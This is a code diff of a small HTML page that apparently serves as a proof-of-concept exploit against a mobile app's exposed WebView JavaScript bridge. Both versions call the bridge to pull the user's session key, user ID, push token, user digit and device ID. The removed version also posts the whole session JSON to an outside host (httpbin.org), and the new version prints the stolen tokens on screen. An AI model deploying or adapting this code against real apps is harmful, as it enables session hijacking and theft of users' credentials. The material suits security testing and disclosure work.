@@ -1,44 +1,47 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
   <html>
-  <head><title>X</title><meta charset="utf-8"></head>
-  <body style="background:#000;color:#0f0;font:12px monospace;padding:10px">
-  <div id="s">Loading...</div>
+  <head><title>Token</title><meta charset="utf-8"></head>
+  <body style="background:#000;color:#0f0;font:14px monospace;padding:10px">
+  <pre id="s">Loading...</pre>
   <script>
   var B = window.B612KajiBridgeInterface;
   var s = document.getElementById('s');
 
   if (B) {
-      s.innerHTML = 'Bridge OK<br>';
+      s.textContent = 'Bridge OK\n\n';
 
       window.c1 = function(d) {
           var x = typeof d === 'string' ? JSON.parse(d) : d;
-          s.innerHTML += 'Session captured<br>';
 
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://httpbin.org/post', true);
-          xhr.setRequestHeader('Content-Type', 'application/json');
-          xhr.send(JSON.stringify({session: x}));
+          s.textContent += '=== SESSION KEY ===\n';
+          var sk = x.sessionKey || '';
+          for (var i = 0; i < sk.length; i += 40) {
+              s.textContent += sk.substring(i, i + 40) + '\n';
+          }
 
-          s.innerHTML += '<br><b>userDigit:</b><br>';
-          s.innerHTML += '<textarea style="width:100%;height:60px;font-size:10px">' + (x.userDigit ||
-  'N/A') + '</textarea>';
+          s.textContent += '\n=== USER DIGIT ===\n';
+          s.textContent += (x.userDigit || 'N/A') + '\n';
 
-          s.innerHTML += '<br><b>Full Session JSON:</b><br>';
-          s.innerHTML += '<textarea style="width:100%;height:200px;font-size:8px">' + JSON.stringify(x,
-  null, 2) + '</textarea>';
+          s.textContent += '\n=== USER ID ===\n';
+          s.textContent += (x.userId || 'N/A') + '\n';
+
+          s.textContent += '\n=== PUSH TOKEN ===\n';
+          var pt = x.pushToken || '';
+          for (var i = 0; i < pt.length; i += 40) {
+              s.textContent += pt.substring(i, i + 40) + '\n';
+          }
       };
       B.getUserSession('c1');
 
       window.c2 = function(d) {
-          var x = typeof d === 'string' ? JSON.parse(d) : x;
-          s.innerHTML += '<br><b>duid:</b><br>';
-          s.innerHTML += '<textarea style="width:100%;height:30px;font-size:10px">' + (x.duid || 'N/A') +
-  '</textarea>';
+          var x = typeof d === 'string' ? JSON.parse(d) : d;
+          s.textContent += '\n=== DUID ===\n';
+          s.textContent += (x.duid || 'N/A') + '\n';
       };
       B.appInfo('c2');
 
   } else {
-      s.innerHTML = 'No Bridge';
+      s.textContent = 'No Bridge';
   }
   </script>
   </body>
